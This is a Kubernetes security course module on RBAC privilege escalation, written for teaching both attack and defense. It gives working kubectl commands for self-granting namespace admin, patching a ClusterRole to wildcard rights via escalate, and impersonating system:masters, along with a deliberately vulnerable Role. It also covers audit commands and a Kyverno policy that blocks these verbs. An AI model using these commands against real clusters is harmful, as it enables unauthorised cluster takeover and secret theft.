# RBAC Privilege Escalation

> **Module 02 · Course 03** — Module 01 drew the escalation chain and the first challenge walked you across its first link: a mounted token that read a Secret. That Secret-read happened because of **RBAC** — the authorization layer that decides what a credential can do once the API server has authenticated it. This module goes deep on the single most common way a limited credential becomes `cluster-admin`: not a kernel bug, not a CVE, but RBAC doing exactly what it was told. You'll learn the three verbs that make RBAC self-referential (`escalate`, `bind`, `impersonate`), how a wildcard grant quietly includes them, and how to enumerate your own effective permissions — the one recon skill that doubles as your best audit.

You already write Roles and RoleBindings at work. What separates someone who *uses* RBAC from someone who can *attack and defend* it is understanding that RBAC can grant permission **over RBAC itself** — and that the authorizer evaluates grants literally, with no notion of "but surely you didn't mean to give this away." Every escalation below is the cluster faithfully honoring a grant somebody wrote.

---

## The RBAC object model in 30 seconds

Four object kinds, two of them namespaced and two cluster-scoped. The asymmetry is where bugs hide.

```
   (namespaced)                          (cluster-scoped)
   ┌──────────────┐                      ┌────────────────────┐
   │     Role     │  rules: verbs ×      │  ClusterRole       │  same rules,
   │              │        resources     │                    │  but cluster-wide
   └──────┬───────┘                      └─────────┬──────────┘
          │ bound by                               │ bound by
   ┌──────▼───────┐                      ┌─────────▼──────────┐
   │ RoleBinding  │ ── subject ──▶ SA /  │ ClusterRoleBinding │ ── subject ──▶ ...
   │              │   User / Group       │                    │
   └──────────────┘                      └────────────────────┘
```

| Object | Scope | Grants | Gotcha |
|--------|-------|--------|--------|
| `Role` | one namespace | verbs on resources in that namespace | can't grant cluster-scoped resources (nodes, PVs) |
| `ClusterRole` | whole cluster | verbs cluster-wide, or namespaced resources in *every* namespace | reusable — the dangerous ones ship built-in |
| `RoleBinding` | one namespace | binds a Role **or a ClusterRole** to subjects, scoped to that namespace | binding a ClusterRole via RoleBinding confines it to the namespace — a useful, often-missed trick |
| `ClusterRoleBinding` | whole cluster | binds a ClusterRole to subjects, everywhere | this is how most "oops, cluster-admin" happens |

The authorization decision is a pure union: a request is allowed if **any** rule from **any** bound (Cluster)Role permits it. There is no `deny` rule in RBAC — you cannot subtract a permission, only avoid granting it. That one fact drives every defense in this module: least privilege is the *only* lever, because there is no deny to patch over a too-broad allow.

---

## The three verbs that turn RBAC against itself

Most verbs (`get`, `list`, `create`, `delete`, `watch`) act on *workload* resources. Three verbs act on the *authorization system* and are the crown jewels of any escalation:

| Verb | On resource | What it lets the subject do | Why it's radioactive |
|------|-------------|-----------------------------|----------------------|
| `escalate` | `roles` / `clusterroles` | create or edit a Role whose rules exceed the creator's own | bypasses the built-in "you can't grant what you don't have" guard |
| `bind` | `rolebindings` / `clusterrolebindings` | create a binding referencing a Role more powerful than the creator | lets you *point* a subject at `cluster-admin` |
| `impersonate` | `users` / `groups` / `serviceaccounts` | send requests **as** another identity (`--as`) | become any user/group, including `system:masters` |

Normally the API server has a guard called **privilege escalation prevention**: when you `create`/`update` a Role or RoleBinding, the authorizer checks that you already hold every permission you're trying to grant. The `escalate` and `bind` verbs are the documented *opt-out* of that guard. They exist for legitimate controllers (think GitOps operators that manage RBAC), but a grant of either is effectively a grant of everything reachable from there.

```
  subject has:  bind on clusterrolebindings
        │
        ▼  create a ClusterRoleBinding
  subject ──────────────▶  cluster-admin ClusterRole
        │  (allowed: bind opts out of the escalation guard)
        ▼
  subject is now, effectively, cluster-admin
```

> **The grant that reads innocent but isn't.** `verbs: ["create"]` on `rolebindings` *looks* like "can manage bindings in this namespace." Combined with the fact that a RoleBinding can reference **any** ClusterRole — including the built-in `cluster-admin` and `admin` — it means the subject can bind *itself* to `admin` in that namespace. The escalation guard normally blocks this unless the subject already holds those perms... **or** has `bind`. Reviewers who don't know the guard exists tend to either over-grant `bind` "to be safe" or assume `create rolebindings` is harmless. Both are wrong.

---

## Wildcards: the grant that includes verbs you didn't name

A wildcard grant is the most common real-world root cause. These three rules are each, individually, equivalent to `cluster-admin`:

```yaml
# All of these are "you own the cluster," written three different innocent-looking ways.
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]            # (a) everything, everywhere

  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["*"]
    verbs: ["*"]            # (b) includes escalate + bind -> self-grant to anything

  - nonResourceURLs: ["*"]
    verbs: ["*"]            # (c) hits /healthz, /metrics, and more than people think
```

The trap in (a) and (b): `verbs: ["*"]` silently includes `escalate`, `bind`, and `impersonate`. Someone writes `["*"]` meaning "all the normal CRUD verbs" and hands over the authorization system by accident. A defender scanning for risk should treat any `*` in `verbs`, `resources`, or `apiGroups` on an RBAC resource as a finding, full stop.

| Pattern in a rule | Effective power | Verdict |
|-------------------|-----------------|---------|
| `verbs: ["*"]` on `roles`/`rolebindings` | includes `escalate`/`bind` | cluster-admin-equivalent |
| `resources: ["*"]` in `rbac.authorization.k8s.io` | includes roles + bindings | cluster-admin-equivalent |
| `impersonate` on `groups` | can become `system:masters` | cluster-admin-equivalent |
| binding the built-in `cluster-admin` ClusterRole | — | literally cluster-admin |
| `verbs: ["get","list"]` on `secrets`, cluster-wide | reads every Secret (incl. SA tokens) | one hop from cluster-admin |

That last row is the sleeper. **Read access to all Secrets is read access to every ServiceAccount token**, and a token for a more-privileged SA is a login to that SA. `list secrets` cluster-wide is not "read-only, so it's fine" — it's a path to impersonating the most powerful SA in the cluster.

---

## Escalation path 1 — self-grant via `create` on bindings

This is the canonical over-broad-RBAC escalation. The subject can create RoleBindings in its namespace (a grant a team might give a "namespace admin") and uses it to bind itself to the built-in `admin` ClusterRole.

```bash
# Attacker holds: create/get/list on rolebindings in dojo-rbac (via a stolen token or compromised SA).
# Goal: become admin of the namespace without anyone granting it explicitly.

kubectl -n dojo-rbac create rolebinding pwn \
  --clusterrole=admin \
  --serviceaccount=dojo-rbac:lowpriv-sa

# If the escalation guard blocks it (subject lacks admin already and lacks bind),
# that block IS the defense working. The vuln exists when the subject ALSO has `bind`,
# or already holds the perms it's granting (making the grant pointless but legal).
```

The variant that works even against the guard is when the subject has `bind`:

```yaml
# The planted-vulnerable Role: "manage bindings" PLUS the bind opt-out.
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["rolebindings"]
    verbs: ["create", "get", "list", "bind"]   # <-- `bind` is the whole bug
```

With `bind`, `kubectl create rolebinding pwn --clusterrole=admin ...` succeeds regardless of what the subject currently holds. One command, and `lowpriv-sa` is a namespace admin — able to read every Secret in `dojo-rbac`, including other SAs' tokens.

---

## Escalation path 2 — `escalate` to author a god-Role

If the subject can `update`/`create` ClusterRoles **and** has `escalate`, it writes its own rules:

```bash
# Subject has escalate on clusterroles. It rewrites a role it's already bound to.
kubectl patch clusterrole lowpriv-reader --type=json -p='[
  {"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}
]'
# Without `escalate`, the API server rejects this: "user ... is attempting to grant RBAC
# permissions not currently held". WITH escalate, it's allowed. The subject just made
# the role it holds into cluster-admin.
```

---

## Escalation path 3 — `impersonate` to *be* someone powerful

No binding changes needed; you just send requests as a stronger identity.

```bash
# Subject has: impersonate on users/groups/serviceaccounts.
# Become the all-powerful built-in group:
kubectl get secrets -A --as-group=system:masters --as=anything
# system:masters is hard-wired to cluster-admin BEFORE RBAC even runs — it's checked by
# the authorizer as a superuser group. Impersonating into it is total compromise.

# Or impersonate a specific privileged SA:
kubectl auth can-i --list \
  --as=system:serviceaccount:kube-system:clusterrole-aggregation-controller
```

Impersonation is logged (the audit log records both the real user and the `impersonated` identity), which is the one silver lining and a key detection hook — see Debugging.

---

## Recon / self-audit: enumerate your effective permissions

This is the same command an attacker runs first and the one you should run against every workload SA you own. Identical API, opposite intent.

```bash
# 1) The map: everything THIS credential can do.
kubectl auth can-i --list

# 2) Targeted questions (exit code is scriptable: 0 = yes).
kubectl auth can-i create rolebindings -n dojo-rbac
kubectl auth can-i impersonate users
kubectl auth can-i '*' '*' --all-namespaces       # am I effectively cluster-admin?

# 3) Audit SOMEONE ELSE's power without being them (needs impersonate — or admin):
kubectl auth can-i --list \
  --as=system:serviceaccount:dojo-rbac:lowpriv-sa

# 4) Who can perform a dangerous action, cluster-wide? (reverse lookup)
kubectl auth can-i --list --as=system:serviceaccount:dojo-rbac:lowpriv-sa \
  | grep -E 'rolebindings|clusterrole|secrets|impersonate|\*'
```

`kubectl auth can-i --list` is powered by `SelfSubjectRulesReview`; the `--as` variants drive `SubjectAccessReview`. The three-column output (`Resources  Non-Resource URLs  Resource Names  Verbs`) is the single densest signal in RBAC auditing. The instant you see `*.*` with `[*]`, or `rolebindings` with `[create]`/`[bind]`, or anything with `[impersonate]`, you've found an escalation.

To find bindings to the built-in super-roles across the whole cluster — the first thing to grep in any audit:

```bash
# Every subject bound to cluster-admin:
kubectl get clusterrolebindings -o jsonpath='{range .items[?(@.roleRef.name=="cluster-admin")]}{.metadata.name}{"\t"}{.subjects}{"\n"}{end}'

# Every binding (any kind) that references a ClusterRole, with its subjects:
kubectl get clusterrolebindings,rolebindings -A \
  -o custom-columns=KIND:.kind,NS:.metadata.namespace,NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name
```

---

## The DEFENSE — least privilege, concretely

Every escalation above collapses under the same four disciplines. None are exotic; all are things you can apply to your SAP workloads today.

**1. Never grant the self-referential verbs to workloads.** `escalate`, `bind`, and `impersonate` belong to a tiny number of platform controllers, never to application ServiceAccounts. Grep your RBAC for them and justify every hit:

```bash
kubectl get clusterroles -o json \
  | kubectl get clusterroles -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.rules}{"\n"}{end}' \
  | grep -E 'escalate|bind|impersonate'
```

**2. Ban wildcards in authored RBAC.** Replace `verbs: ["*"]` with the explicit verb list the workload uses; replace `resources: ["*"]` and `apiGroups: ["*"]` with named resources. If you can't enumerate what a Role needs, the workload doesn't understand its own access — fix that first.

**3. Pin with `resourceNames`.** A workload that needs one Secret should name it, so even a token can't read the others:

```yaml
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get"]
    resourceNames: ["the-one-secret"]   # not all secrets in the namespace
```

**4. Prefer RoleBindings over ClusterRoleBindings.** Binding even a powerful ClusterRole through a *namespaced* RoleBinding confines it to that namespace. A ClusterRoleBinding to `admin` is cluster-wide admin; a RoleBinding to `admin` in `dojo-rbac` is admin of `dojo-rbac` only. Reach for the narrowest binding that works.

**5. Enforce it with admission, not vigilance.** Humans miss `["*"]` in review. A policy engine doesn't:

```yaml
# Kyverno ClusterPolicy sketch: reject any Role/ClusterRole granting the dangerous verbs.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-rbac-escalation-verbs
spec:
  validationFailureAction: Enforce
  rules:
    - name: no-escalate-bind-impersonate
      match:
        any:
          - resources:
              kinds: ["Role", "ClusterRole"]
      validate:
        message: "Roles may not grant escalate/bind/impersonate or wildcard verbs."
        deny:
          conditions:
            any:
              - key: "{{ request.object.rules[].verbs[] }}"
                operator: AnyIn
                value: ["escalate", "bind", "impersonate", "*"]
```

> **Keep the balanced framing:** the three verbs exist because real controllers need them. Defense isn't "ban them from the cluster," it's "grant them to exactly the two or three platform identities that provably need them, and alert when a fourth appears."

---

## Debugging RBAC Privilege Escalation

RBAC failures split cleanly into two camps: *"I'm blocked and shouldn't be"* (a legit workload missing a grant) and *"someone got through and shouldn't have"* (an escalation you need to trace). Diagnose with `can-i`, confirm with the audit log. The golden rule: **the API server's `Forbidden` message names exactly the verb, resource, and group it wanted — read it literally, don't guess.**

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| `Error from server (Forbidden): ... cannot create resource "rolebindings"` | subject lacks `create` on rolebindings in that namespace | grant it narrowly, or confirm the subject *shouldn't* have it (escalation attempt) |
| `attempting to grant RBAC permissions not currently held` | escalation guard fired — subject tried to grant perms it lacks and has no `escalate`/`bind` | this is the guard WORKING; do not "fix" it by granting `bind` |
| A workload SA can suddenly do far more than its Role lists | it's also bound by a second, broader (Cluster)RoleBinding; RBAC is a union | enumerate ALL bindings for the subject, not just the obvious one |
| `can-i '*' '*'` returns `yes` for an app SA | a wildcard ClusterRole or a cluster-admin binding | find the binding and scope it down |
| Impersonation requests succeed from a workload | SA has `impersonate` | revoke it; it belongs only to auth proxies |
| A RoleBinding to `cluster-admin` "only affects one namespace" — but subject is cluster-admin everywhere | it's actually a *ClusterRoleBinding*, or the ClusterRole is aggregated | check `kind:` and `roleRef`; switch to a namespaced RoleBinding |

### Diagnose each — the exact commands

**"Blocked and shouldn't be."** Make the API server tell you precisely what's missing, then grant exactly that:

```bash
kubectl auth can-i create deployments -n dojo-rbac \
  --as=system:serviceaccount:dojo-rbac:lowpriv-sa      # -> no
# The Forbidden error on the real call names the group/resource/verb — copy it into the Role.
```

**"Got through and shouldn't have" — find every binding for a subject.** RBAC is a union, so the dangerous grant is often a *second* binding nobody remembers:

```bash
SUBJ=system:serviceaccount:dojo-rbac:lowpriv-sa

# All ClusterRoleBindings naming this SA:
kubectl get clusterrolebindings -o json \
  | kubectl get clusterrolebindings \
    -o jsonpath='{range .items[*]}{.metadata.name}{" -> "}{.roleRef.name}{" :: "}{.subjects}{"\n"}{end}' \
  | grep lowpriv-sa

# All RoleBindings, every namespace:
kubectl get rolebindings -A \
  -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" -> "}{.roleRef.name}{" :: "}{.subjects}{"\n"}{end}' \
  | grep lowpriv-sa

# Then read what each referenced role actually grants:
kubectl get clusterrole admin -o jsonpath='{.rules}'; echo
```

**Prove the escalation, then prove the fix.** The clean before/after a reviewer wants to see:

```bash
# Before the fix: the vulnerable SA can self-grant.
kubectl auth can-i create rolebindings -n dojo-rbac --as=$SUBJ      # -> yes   (the bug)

# Apply least-privilege Role (drop create/bind on rolebindings), then:
kubectl auth can-i create rolebindings -n dojo-rbac --as=$SUBJ      # -> no    (fixed)
```

**Catch it in the act — the audit log.** On a kind cluster the API server runs inside the control-plane node container, so you drop to `docker` to reach its logs. Escalations and impersonations are visible there:

```bash
# API-server process logs (kind runs it as a static pod in the control-plane node):
docker exec dojo-control-plane crictl ps --name kube-apiserver
docker exec dojo-control-plane sh -c \
  'crictl logs $(crictl ps -q --name kube-apiserver) 2>&1 | grep -iE "forbidden|escalat|impersonat" | tail -20'

# If audit logging is enabled, impersonation records BOTH identities — grep for it:
#   "user.username":"..."   alongside   "impersonatedUser":{...}
```

Impersonation is the one escalation that always leaves a two-identity trail in the audit log — build your detection on that, because the `impersonatedUser` field appears on no legitimate application request.

> **War story.** On the LGTM pipeline at SAP we gave a log-shipper ServiceAccount a ClusterRole with `resources: ["*"]`, `verbs: ["get","list","watch"]` — "it only reads, it's fine." A dependency CVE later gave someone code-exec in that pod, and `can-i --list` showed the payoff: `list` on `secrets` **cluster-wide**. That's not read-only — it's read access to every ServiceAccount token in every namespace, including ones bound to `cluster-admin`. The shipper needed `pods` and `events` in three namespaces; it had been handed the keys to the cluster because `["*"]` was faster to type than the real resource list. The fix was 11 lines of explicit resources and a Kyverno rule that now rejects `resources: ["*"]` at admission. The lesson that stuck: **"read-only" is a claim about verbs, never about blast radius — `list secrets` is a credential-harvesting primitive.**

---

## Checkpoint

You're ready for the challenge when you can, without looking anything up:

1. Explain why RBAC has no `deny` rule and what that implies for how you must defend it.
2. Name the three self-referential verbs (`escalate`, `bind`, `impersonate`) and state the one thing each lets a subject do.
3. Describe the API server's privilege-escalation guard and name the two verbs that opt out of it.
4. Show why `verbs: ["*"]` on `rolebindings` is cluster-admin-equivalent even without naming `escalate`.
5. Explain why `list secrets` cluster-wide is a path to cluster-admin, not a benign read grant.
6. Self-grant namespace `admin` to a low-priv SA using only `create`/`bind` on rolebindings — then break it with least privilege.
7. Impersonate `system:masters` and explain why that group is checked *before* RBAC runs.
8. Run `kubectl auth can-i --list` (yours) and `--as=<sa>` (another's) and read the output to spot an escalation.
9. Trace a surprising permission to a *second* binding by enumerating every (Cluster)RoleBinding naming a subject.
10. Find the escalation/impersonation evidence in the API-server logs via `docker exec dojo-control-plane crictl logs`.

➡ Next up: the **Exposed Kubelet & API Surfaces** module — once you understand how a credential escalates *inside* the API server's authorization, you'll look at the surfaces that let a caller skip the API server (and its RBAC) altogether: the kubelet on `:10250` and the auth chain in front of `:6443`.
